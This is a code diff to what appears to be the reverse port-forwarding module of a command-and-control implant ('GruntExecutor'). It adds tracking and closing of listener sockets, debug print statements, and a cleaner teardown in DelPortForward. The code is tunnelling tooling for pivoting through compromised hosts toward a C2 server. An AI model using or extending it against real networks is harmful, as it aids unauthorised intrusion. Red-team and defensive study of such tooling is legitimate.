@@ -24,12 +24,14 @@ namespace GruntExecutor
         public static class Portfwd
 
         //Reverse Port Forward by Thiago Mayllart
+        //Enhanced by Oliver
 
         {
 
             public static Dictionary<string, bool> states = new Dictionary<string, bool>();
             public static Dictionary<string, bool> last_states = new Dictionary<string, bool>();
             public static Dictionary<string, List<Socket>> target_sockets = new Dictionary<string, List<Socket>>();
+            public static Dictionary<string, Socket> listener_sockets = new Dictionary<string, Socket>();
             public static Dictionary<string, List<Socket>> c2_sockets = new Dictionary<string, List<Socket>>();
             public static Dictionary<string, Thread> portfwds = new Dictionary<string, Thread>();
             public static Dictionary<string, List<string>> info_list = new Dictionary<string, List<string>>();
@@ -353,6 +355,7 @@ namespace GruntExecutor
                         socketListener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
                         socketListener.Bind(new IPEndPoint(bindAddress, bindPort));
                         socketListener.Listen(200);
+                        listener_sockets[bind_port] = socketListener;
                     }
 
                     while (states[bind_port])
@@ -411,8 +414,9 @@ namespace GruntExecutor
                     Console.WriteLine(e.Message);
                 }
 
+                Console.WriteLine("DEBUG:: End of handleData. ");
 
-            }
+            } //End of handledata
 
             public static string AddPortForward(string ip, string bind_port, string target_port, string target_ip, string rand_port)
             {
@@ -429,15 +433,32 @@ namespace GruntExecutor
 
             public static string DelPortForward(string bind_port)
             {
+                Console.WriteLine("DEBUG:: In DelPortForward... ");
+                
+                
+
                 try
                 {
                     states[bind_port] = false;
                     info_list.Remove(bind_port);
+                    //this should kill the thread
+                    listener_sockets[bind_port].Shutdown(SocketShutdown.Both);
+                    listener_sockets[bind_port].Close();
                 }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
+
+                catch (ObjectDisposedException ef){
+                    Console.WriteLine("DEBUG:: ShutDown failed ObjectDisposedException, Trying to close ...");
+                    listener_sockets[bind_port].Close();
                 }
+                catch (SocketException ef){
+                    Console.WriteLine("DEBUG:: ShutDown failed SocketException, Trying to close ...");
+                    listener_sockets[bind_port].Close();
+                }
+                catch (Exception ef){
+                    Console.WriteLine("DEBUG:: Nothing to do ...");
+                }
+
+
                 foreach (Socket sc in c2_sockets[bind_port])
                 {
                     try
@@ -462,14 +483,9 @@ namespace GruntExecutor
                         Console.WriteLine(e.Message);
                     }
                 }
-                try
-                {
-                    portfwds[bind_port].Abort();
-                }
-                catch (Exception e)
-                {
 
-                }
+                Console.WriteLine("DEBUG:: End DelPortForward... ");
+
                 return ShowReversePortForwwrds();
             }
 
@@ -606,9 +622,7 @@ namespace GruntExecutor
                     output += "DEBUG::";
                     output += comm;
                     output += "\n";
-                    output += commands.ToString();
-                    output += "\n";
-
+                    
                     switch (comm)
                     {
                         case "list":
